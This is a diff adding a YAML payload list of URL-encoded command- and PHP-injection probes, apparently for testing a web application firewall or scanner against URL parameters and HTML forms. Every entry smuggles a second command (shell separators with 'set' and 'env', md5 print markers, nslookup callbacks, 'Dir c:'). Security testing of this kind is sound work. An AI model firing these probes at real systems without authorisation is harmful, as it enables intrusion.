@@ -1,0 +1,22 @@
+payload:
+  - 'set%7cset%26set'
+  - '%22set%7cset%26set%22'
+  - '%0aset%7cset%26set%0a'
+  - '%60set%7cset%26set%60'
+  - 'print%20%60env%60'
+  - ';set%7cset%26set;'
+  - ';print(md5(acunetix_wvs_security_test));'
+  - ';print(md5(acunetix_wvs_security_test));%24a%3d'
+  - '%22;print(md5(acunetix_wvs_security_test));%24a%3d%22'
+  - '%24%7b%40print(md5(acunetix_wvs_security_test))%7d'
+  - '%24%7b%40print(md5(acunetix_wvs_security_test))%7d%5c'
+  - 'blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/acunetix;'
+  - '%24(nslookup%20cyIHgfgY)'
+  - '%26nslookup%20ieLVQpXM%26"%5c%22%600%26nslookup%20ieLVQpXM%26%60"'
+  - '+|+Dir+c:%255c'
+  - '$+|+Dir+c:%255c'
+encoder:
+  - Plain
+placeholder:
+  - URLParam
+  - HTMLForm
